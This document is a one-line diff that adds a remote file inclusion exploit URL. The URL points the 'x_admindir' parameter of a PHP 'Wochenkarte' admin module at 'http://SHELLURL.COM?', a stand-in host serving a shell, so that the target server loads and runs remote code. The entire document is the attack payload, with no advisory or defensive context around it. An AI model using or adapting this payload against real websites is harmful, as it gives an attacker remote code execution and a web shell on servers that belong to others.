@@ -1,0 +1,1 @@
+http://www.example.com/[Script Path]/0_admin/modules/Wochenkarte/frontend/index.php?x_admindir=http://SHELLURL.COM?
